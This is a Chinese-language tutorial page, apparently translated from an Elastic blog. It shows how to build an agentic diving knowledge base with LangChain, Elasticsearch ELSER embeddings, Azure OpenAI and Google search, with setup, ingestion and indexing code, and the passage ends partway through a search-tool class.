content="Elasticsearch"/> <meta itemprop="url" content="https://juejin.cn/user/2612095360441448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何使用 LangChain 和 Elasticsearch 构建 agent 知识库
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612095360441448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Elasticsearch
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T05:41:17.000Z" title="Thu Jan 01 2026 05:41:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作者：来自 Elastic <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fauthor%2Fhan-xiang-choong" title="https://www.elastic.co/search-labs/author/han-xiang-choong" target="_blank" ref="nofollow noopener noreferrer">Han Xiang Choong</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be1ac6ad096c4ffc9415d96bbc8eefa9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767850877&amp;x-signature=mQGao%2FHEpJaFseX4OwVMZU9jJ6A%3D" alt="" loading="lazy"/></p>
<p>学习如何构建一个 agent 知识库，并测试它基于上下文查询信息源的能力，对超出范围的查询使用 WebSearch，并根据用户意图优化推荐。</p>
<p>Agent Builder 现在以 tech preview 形式提供。使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.elastic.co%2Fregistration%3Futm_source%3Dagentic-ai-category%26utm_medium%3Dsearch-labs%26utm_campaign%3Dagent-builder" title="https://cloud.elastic.co/registration?utm_source=agentic-ai-category&amp;utm_medium=search-labs&amp;utm_campaign=agent-builder" target="_blank" ref="nofollow noopener noreferrer">Elastic Cloud Trial</a> 开始，并在<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fsolutions%2Fsearch%2Felastic-agent-builder%3Futm_source%3Dagentic-ai-category%26utm_medium%3Dsearch-labs%26utm_campaign%3Dagent-builder" title="https://www.elastic.co/docs/solutions/search/elastic-agent-builder?utm_source=agentic-ai-category&amp;utm_medium=search-labs&amp;utm_campaign=agent-builder" target="_blank" ref="nofollow noopener noreferrer">这里</a>查看 Agent Builder 的文档。</p>
<hr/>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ced13a9702d4fe892eb6db059e16ae4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767850877&amp;x-signature=ZnY7M5dnab46WD9gO%2Bq4OsTJYAA%3D" alt="" loading="lazy"/> 大型语言模型在各个行业中的应用。</p>
<p>在行业使用场景中，与大型语言模型（ LLMs ）交互主要有两种模式。直接查询，即以临时方式与 LLM 对话，适用于获取诸如摘要、校对、信息抽取以及非特定领域查询等任务的帮助。</p>
<p>对于特定的业务应用，例如客户关系管理、 IT 系统维护以及调查工作等，仅使用 LLM 是不够的。私有的、企业特有的信息，或关于小众兴趣和主题的信息，甚至来自特定文档和书面来源的信息，通常在 LLM 的训练数据集中是缺失的。此外，现实世界的数据在不断变化，企业环境也在持续演进。 LLM 也往往需要对事实准确性进行强化。所有这些因素都限制了直接使用 LLM 在企业使用场景中的实用价值，尤其是那些需要关于特定技术或业务主题的最新事实信息的场景。</p>
<p>检索增强生成（ <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F134396254" title="https://elasticstack.blog.csdn.net/article/details/134396254" target="_blank" ref="nofollow noopener noreferrer">Retrieval Augmented Generation</a>，RAG ）通过使用<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F134770001" title="https://elasticstack.blog.csdn.net/article/details/134770001" target="_blank" ref="nofollow noopener noreferrer">可搜索的数据存储</a>来检索与用户查询的上下文和意图相关的信息源，被推广为解决这一不足的方法。围绕 RAG 应用的<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F147525461" title="https://elasticstack.blog.csdn.net/article/details/147525461" target="_blank" ref="nofollow noopener noreferrer">实现</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F146331517" title="https://elasticstack.blog.csdn.net/article/details/146331517" target="_blank" ref="nofollow noopener noreferrer">评估</a>以及质量<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F146195339" title="https://elasticstack.blog.csdn.net/article/details/146195339" target="_blank" ref="nofollow noopener noreferrer">改进</a>已经开展了大量工作， RAG 也在企业使用场景中被广泛采用，用于提升生产力和实现工作流自动化。然而， RAG 并未利用大型语言模型的决策能力。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d3fb00d8b5244cb91f7805076501bd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767850877&amp;x-signature=OqmX1B7bFdvA2GsuzwoQnjzOH%2B4%3D" alt="" loading="lazy"/></p>
<p>大型语言模型的不同应用模式。</p>
<p>Agentic 模型的核心在于 LLM 能够根据用户输入采取特定的行动。这些行动可能涉及使用工具来增强 LLM 现有的能力。从这个意义上说， RAG 充当一个长期记忆存储， LLM agent 可以选择使用它来增强和强化对用户查询的回答。传统的 RAG 模型是由 LLM 查询一个或多个知识库，而 agentic 实现则允许 LLM 从一组知识库中进行选择。这使问答行为更加灵活，并且可以提高准确性，因为无关知识库中的信息会被省略，从而减少潜在的噪声来源。我们可以将这样的系统称为 “ agent 知识库 ”。下面我们来看看如何使用 Elasticsearch 实现这样一个系统。</p>
<h2 data-id="heading-0">设计一个 agent 知识库</h2>
<p>所有代码都可以<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpioorg%2Fagentic_search_example_UI" title="https://github.com/pioorg/agentic_search_example_UI" target="_blank" ref="nofollow noopener noreferrer">在 GitHub 仓库</a>中找到。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd40bb82afde4fb1948260b5b1d52201~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767850877&amp;x-signature=1jprV7i96qPLq8LBRBLH64M6bnw%3D" alt="" loading="lazy"/> 本文实现的 agent 知识库。</p>
<p>我最近在尝试潜水后对它产生了兴趣，并意识到它可以治愈我长期的海洋恐惧症（ <a href="https://link.juejin.cn?target=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FThalassophobia" title="https://en.wikipedia.org/wiki/Thalassophobia" target="_blank" ref="nofollow noopener noreferrer">thalassophobia</a> ），于是我决定为潜水专门建立一个 agent 知识库。</p>
<ul>
<li>美国海军潜水手册 - 包含大量关于潜水操作和设备的技术细节。</li>
<li>潜水安全手册 - 包含面向休闲潜水员的一般指导方针和操作程序。</li>
<li>Google Custom Search API - 能够搜索网页中不包含在上述两本手册中的任何信息。</li>
</ul>
<p>目标是让这个 Diving Assistant 成为潜水相关知识的一站式工具，能够回答任何查询，即使是超出已导入知识库范围的问题。 LLM 会识别用户查询背后的动机，并选择最可能相关的信息源。我决定使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.langchain.com%2F" title="https://www.langchain.com/" target="_blank" ref="nofollow noopener noreferrer">LangChain</a> 作为 agentic 包装器，并在其上构建了一个 <a href="https://link.juejin.cn?target=https%3A%2F%2Fstreamlit.io%2F" title="https://streamlit.io/" target="_blank" ref="nofollow noopener noreferrer">streamlit UI</a>。</p>
<h2 data-id="heading-1">设置端点</h2>
<p>我首先创建一个 .env 文件，并填入以下变量：</p>
<pre><code class="hljs language-ini" lang="ini">`

<span class="hljs-attr">1.  ELASTIC_ENDPOINT</span>=&lt;ELASTIC CLOUD ENDPOINT&gt;
<span class="hljs-attr">2.  ELASTIC_API_KEY</span>=&lt;ELASTIC CLOUD API KEY&gt;

4.  <span class="hljs-comment"># Enable custom search API</span>
5.  <span class="hljs-comment"># https://developers.google.com/custom-search/v1/introduction/?apix=true</span>
<span class="hljs-attr">6.  GCP_API_KEY</span>=&lt;GCP API KEY&gt;
<span class="hljs-attr">7.  GCP_PSE_ID</span>=&lt;GCP PSE ID&gt;

<span class="hljs-attr">9.  AZURE_OPENAI_SYSTEM_PROMPT</span>=<span class="hljs-string">"You are a helpful assistant. Be as concise and efficient as possible. Convey maximum meaning in fewest words possible."</span>

<span class="hljs-attr">11.  AZURE_OPENAI_ENDPOINT</span>=&lt;AZURE ENDPOINT&gt;
<span class="hljs-attr">12.  AZURE_OPENAI_API_VERSION</span>=&lt;AZURE API VERDSION&gt;
<span class="hljs-attr">13.  AZURE_OPENAI_API_KEY</span>=&lt;AZURE API KEY&gt;
<span class="hljs-attr">14.  AZURE_OPENAI_MODEL</span>=<span class="hljs-string">"gpt-4o-mini"</span>

`AI写代码!<span class="hljs-section">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>该项目使用了部署在 Azure OpenAI 上的 GPT-4o-Mini，以及 Google Custom Search API 和用于存储数据的 Elastic Cloud 部署。我还添加了一个自定义系统提示，鼓励 LLM 尽量避免啰嗦。</p>
<h2 data-id="heading-2">导入和处理</h2>
<p>美国海军潜水手册和潜水安全手册都是 PDF 格式，因此下一步是将它们导入到 Elastic Cloud 部署中。我使用 Elastic 的 bulk API 设置了这个 python 脚本，将文档上传到 Elastic Cloud：</p>
<pre><code class="hljs language-python" lang="python">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">import</span> os
<span class="hljs-number">2.</span>  <span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> defaultdict
<span class="hljs-number">3.</span>  <span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor, as_completed
<span class="hljs-number">4.</span>  <span class="hljs-keyword">from</span> elasticsearch <span class="hljs-keyword">import</span> Elasticsearch, helpers <span class="hljs-comment"># elasticsearch==8.14.0</span>
<span class="hljs-number">5.</span>  <span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm <span class="hljs-comment"># tqdm==4.66.4</span>
<span class="hljs-number">6.</span>  <span class="hljs-keyword">from</span> llama_index.core <span class="hljs-keyword">import</span> SimpleDirectoryReader

<span class="hljs-number">8.</span>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">bulk_upload_to_elasticsearch</span>(<span class="hljs-params">data, index_name, es, batch_size=<span class="hljs-number">500</span>, max_workers=<span class="hljs-number">10</span></span>):
<span class="hljs-number">9.</span>      <span class="hljs-string">''' 
10.      data: [ {document} ]
11.          document: {
12.                      "_id": str
13.                      ...
14.                    }
15.      index_name: str 
16.      es: Elasticsearch 
17.      batch_size: int 
18.      max_workers: int
19.      '''</span>
<span class="hljs-number">20.</span>      total_documents = <span class="hljs-built_in">len</span>(data)
<span class="hljs-number">21.</span>      success_bar = tqdm(total=total_documents, desc=<span class="hljs-string">"Successful uploads"</span>, colour=<span class="hljs-string">"green"</span>)
<span class="hljs-number">22.</span>      failed_bar = tqdm(total=total_documents, desc=<span class="hljs-string">"Failed uploads"</span>, colour=<span class="hljs-string">"red"</span>)

<span class="hljs-number">24.</span>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_action</span>(<span class="hljs-params">doc</span>):
<span class="hljs-number">25.</span>          <span class="hljs-string">'''
26.          Define upload action from source documents
27.          '''</span>
<span class="hljs-number">28.</span>          <span class="hljs-keyword">return</span> {
<span class="hljs-number">29.</span>              <span class="hljs-string">"_index"</span>: index_name,
<span class="hljs-number">30.</span>              <span class="hljs-string">"_id"</span>: doc[<span class="hljs-string">"id_"</span>],
<span class="hljs-number">31.</span>              <span class="hljs-string">"body"</span>: doc[<span class="hljs-string">"text"</span>]
<span class="hljs-number">32.</span>          }

<span class="hljs-number">34.</span>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">read_and_create_batches</span>(<span class="hljs-params">data</span>):
<span class="hljs-number">35.</span>          <span class="hljs-string">''' 
36.          Yield document batches
37.          '''</span>
<span class="hljs-number">38.</span>          batch = []
<span class="hljs-number">39.</span>          <span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> data:
<span class="hljs-number">40.</span>              batch.append(create_action(doc))
<span class="hljs-number">41.</span>              <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(batch) == batch_size:
<span class="hljs-number">42.</span>                  <span class="hljs-keyword">yield</span> batch
<span class="hljs-number">43.</span>                  batch = []
<span class="hljs-number">44.</span>          <span class="hljs-keyword">if</span> batch:
<span class="hljs-number">45.</span>              <span class="hljs-keyword">yield</span> batch

<span class="hljs-number">47.</span>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_batch</span>(<span class="hljs-params">batch</span>):
<span class="hljs-number">48.</span>          <span class="hljs-string">''' 
49.          Make bulk call for batch
50.          '''</span>
<span class="hljs-number">51.</span>          <span class="hljs-keyword">try</span>:
<span class="hljs-number">52.</span>              success, failed = helpers.bulk(es, batch, raise_on_error=<span class="hljs-literal">False</span>, request_timeout=<span class="hljs-number">45</span>)
<span class="hljs-number">53.</span>              <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(failed, <span class="hljs-built_in">list</span>):
<span class="hljs-number">54.</span>                  failed = <span class="hljs-built_in">len</span>(failed)
<span class="hljs-number">55.</span>              <span class="hljs-keyword">return</span> success, failed
<span class="hljs-number">56.</span>          <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
<span class="hljs-number">57.</span>              <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Error during bulk upload: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
<span class="hljs-number">58.</span>              <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(batch)
<span class="hljs-number">59.</span>  <span class="hljs-string">''' 
60.      Parallel execution of batch upload
61.      '''</span>
<span class="hljs-number">62.</span>      <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=max_workers) <span class="hljs-keyword">as</span> executor:
<span class="hljs-number">63.</span>          future_to_batch = {executor.submit(upload_batch, batch): batch <span class="hljs-keyword">for</span> batch <span class="hljs-keyword">in</span> read_and_create_batches(data)}
<span class="hljs-number">64.</span>          <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> as_completed(future_to_batch):
<span class="hljs-number">65.</span>              success, failed = future.result()
<span class="hljs-number">66.</span>              success_bar.update(success)
<span class="hljs-number">67.</span>              failed_bar.update(failed)

<span class="hljs-number">69.</span>      <span class="hljs-string">''' 
70.      Update progress bars
71.      '''</span>
<span class="hljs-number">72.</span>      total_uploaded = success_bar.n
<span class="hljs-number">73.</span>      total_failed = failed_bar.n
<span class="hljs-number">74.</span>      success_bar.close()
<span class="hljs-number">75.</span>      failed_bar.close()

<span class="hljs-number">77.</span>      <span class="hljs-keyword">return</span> total_uploaded, total_failed

<span class="hljs-number">79.</span>  <span class="hljs-comment"># This is connecting to ES Cloud via credentials stored in .env </span>
<span class="hljs-number">80.</span>  <span class="hljs-comment"># May have to change this to suit your env. </span>
<span class="hljs-number">81.</span>  <span class="hljs-keyword">try</span>:
<span class="hljs-number">82.</span>      es_endpoint = os.environ.get(<span class="hljs-string">"ELASTIC_ENDPOINT"</span>)
<span class="hljs-number">83.</span>      es_client = Elasticsearch(
<span class="hljs-number">84.</span>          es_endpoint,
<span class="hljs-number">85.</span>          api_key=os.environ.get(<span class="hljs-string">"ELASTIC_API_KEY"</span>)
<span class="hljs-number">86.</span>      )
<span class="hljs-number">87.</span>  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
<span class="hljs-number">88.</span>      es_client = <span class="hljs-literal">None</span>

<span class="hljs-number">90.</span>  <span class="hljs-built_in">print</span>(es_client.ping())

`AI写代码![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)收起代码块![](https://csdnimg.cn/release/blogv2/dist/pc/img/arrowup-line-top-White.png)
</code></pre>
<p>在下载美国海军潜水手册 PDF 并将其存放在单独文件夹后，我使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.llamaindex.ai%2F" title="https://www.llamaindex.ai/" target="_blank" ref="nofollow noopener noreferrer">LlamaIndex</a> 的 SimpleDirectoryReader 加载 PDF 数据，然后触发批量上传：</p>
<pre><code class="hljs language-ini" lang="ini">`

<span class="hljs-attr">1.  reader</span> = SimpleDirectoryReader(input_dir=<span class="hljs-string">"./data"</span>)
<span class="hljs-attr">2.  documents</span> = reader.load_data()
3.  bulk_upload_to_elasticsearch(<span class="hljs-section">[i.to_dict() for i in list(documents)]</span>, 
4.                              "us_navy_dive_manual_raw", 
5.                              es_client, <span class="hljs-attr">batch_size</span>=<span class="hljs-number">16</span>, max_workers=<span class="hljs-number">10</span>)

`AI写代码
</code></pre>
<p>这会将所有文本内容发送到 Elastic Cloud，每页 PDF 作为一个单独的文档，存入名为 us_navy_dive_manual_raw 的索引中。没有进行进一步处理，因此上传全部 991 页的过程不到一秒。下一步是在 Elastic Cloud 中进行语义嵌入。</p>
<h2 data-id="heading-3">语义数据嵌入与分块</h2>
<p>在我的 Elastic Cloud DevTools 控制台中，我首先使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fapi%2Fdoc%2Felasticsearch%2Fgroup%2Fendpoint-inference" title="https://www.elastic.co/docs/api/doc/elasticsearch/group/endpoint-inference" target="_blank" ref="nofollow noopener noreferrer">Elastic 推理 API</a> 部署 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fexplore-analyze%2Fmachine-learning%2Fnlp%2Fml-nlp-elser" title="https://www.elastic.co/docs/explore-analyze/machine-learning/nlp/ml-nlp-elser" target="_blank" ref="nofollow noopener noreferrer">ELSER v2</a> 模型。</p>
<pre><code class="hljs language-bash" lang="bash">`

1.  PUT _inference/sparse_embedding/elser_v2
2.  {
3.    <span class="hljs-string">"service"</span>: <span class="hljs-string">"elasticsearch"</span>,
4.    <span class="hljs-string">"service_settings"</span>: {
5.      <span class="hljs-string">"num_allocations"</span>: 1,
6.      <span class="hljs-string">"num_threads"</span>: 8,
7.      <span class="hljs-string">"model_id"</span>: <span class="hljs-string">".elser_model_2_linux-x86_64"</span>
8.    },
9.    <span class="hljs-string">"chunking_settings"</span>: {
10.      <span class="hljs-string">"strategy"</span>: <span class="hljs-string">"sentence"</span>,
11.      <span class="hljs-string">"max_chunk_size"</span>: 250,
12.      <span class="hljs-string">"sentence_overlap"</span>: 1
13.    }
14.  }

`AI写代码![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>然后我定义了一个简单的 pipeline。每个文档在 body 字段中存储潜水手册一页的文本，因此我将 body 的内容复制到一个名为 semantic_content 的字段中。</p>
<pre><code class="hljs language-bash" lang="bash">`

1.  PUT _ingest/pipeline/diving_pipeline
2.  {
3.    <span class="hljs-string">"processors"</span>: [
4.      {
5.        <span class="hljs-string">"set"</span>: {
6.          <span class="hljs-string">"field"</span>: <span class="hljs-string">"semantic_content"</span>,

8.          <span class="hljs-string">"copy_from"</span>: <span class="hljs-string">"body"</span>,
9.          <span class="hljs-string">"if"</span>: <span class="hljs-string">"ctx.body != null"</span>
10.        }
11.      }
12.    ]
13.  }

`AI写代码![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>然后我创建了一个名为 us_navy_dive_manual 的新索引，并将 semantic_content 设置为 semantic_text 字段：</p>
<pre><code class="hljs language-bash" lang="bash">`

1.  PUT us_navy_dive_manual
2.  {
3.    <span class="hljs-string">"mappings"</span>: {
4.      <span class="hljs-string">"properties"</span>: {
5.        <span class="hljs-string">"semantic_content"</span>: {
6.          <span class="hljs-string">"type"</span>: <span class="hljs-string">"semantic_text"</span>,
7.          <span class="hljs-string">"inference_id"</span>: <span class="hljs-string">"elser_v2"</span>
8.        }
9.      }
10.    }
11.  }

`AI写代码![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>然后我触发了一个 reindex 任务。现在数据将从 us_navy_dive_manual_raw 流向 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fexplore-analyze%2Fmachine-learning%2Fnlp%2Fml-nlp-elser" title="https://www.elastic.co/docs/explore-analyze/machine-learning/nlp/ml-nlp-elser" target="_blank" ref="nofollow noopener noreferrer">ELSER</a> 进行分块和嵌入，并重新索引到 us_navy_dive_manual 中以供使用。</p>
<pre><code class="hljs language-bash" lang="bash">`

1.  POST _reindex?slices=auto&amp;wait_for_completion=<span class="hljs-literal">false</span>
2.  {
3.    <span class="hljs-string">"source"</span>: {
4.      <span class="hljs-string">"index"</span>: <span class="hljs-string">"us_navy_dive_manual_raw"</span>,
5.      <span class="hljs-string">"size"</span>: 4
6.    },
7.    <span class="hljs-string">"dest"</span>: {
8.      <span class="hljs-string">"index"</span>: <span class="hljs-string">"us_navy_dive_manual"</span>,
9.      <span class="hljs-string">"pipeline"</span>: <span class="hljs-string">"diving_pipeline"</span>
10.    },
11.    <span class="hljs-string">"conflicts"</span>: <span class="hljs-string">"proceed"</span>
12.  }

`AI写代码![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>我对潜水安全手册重复了这个过程，通过这个简单的流程，数据导入就完成了。</p>
<h2 data-id="heading-4">Agentic 搜索的工具</h2>
<p>这个 agent 相对简单，所以我使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fpython.langchain.com%2Fdocs%2Fhow_to%2Fagent_executor%2F" title="https://python.langchain.com/docs/how_to/agent_executor/" target="_blank" ref="nofollow noopener noreferrer">LangChain 的 AgentExecutor</a>，它可以创建一个 agent 并将其与一组工具捆绑在一起。复杂的决策流程可以使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.langchain.com%2Foss%2Fpython%2Flangchain%2Foverview%23langgraph" title="https://docs.langchain.com/oss/python/langchain/overview#langgraph" target="_blank" ref="nofollow noopener noreferrer">LangGraph 实现</a>，我们将在未来的博客中介绍。这里我们将重点关注与 agent 相关的部分，关于实际的 streamlit UI 详情，请查看 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpioorg%2Fagentic_search_example_UI" title="https://github.com/pioorg/agentic_search_example_UI" target="_blank" ref="nofollow noopener noreferrer">github 仓库</a>。</p>
<p>我为我的 agent 创建了两个工具。第一个是 ElasticSearcher 类，它对 Elastic 索引进行<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F145485873" title="https://elasticstack.blog.csdn.net/article/details/145485873" target="_blank" ref="nofollow noopener noreferrer">语义搜索</a>，然后返回前 10 篇文章的文本。</p>
<pre><code class="hljs language-css" lang="css">`

<span class="hljs-number">1</span>.  class ElasticSearcher:
<span class="hljs-number">2</span>.      def <span class="hljs-built_in">__init__</span>(self):
<span class="hljs-number">3</span>.          self.client = <span class="hljs-built_in">Elasticsearch</span>(
<span class="hljs-number">4</span>.              os.environ.<span class="hljs-built_in">get</span>(<span class="hljs-string">"ELASTIC_ENDPOINT"</span>),
<span class="hljs-number">5</span>.              api_key=os.environ.<span class="hljs-built_in">get</span>(<span class="hljs-string">"ELASTIC_API_KEY"</span>)
<span class="hljs-number">6</span>.          )

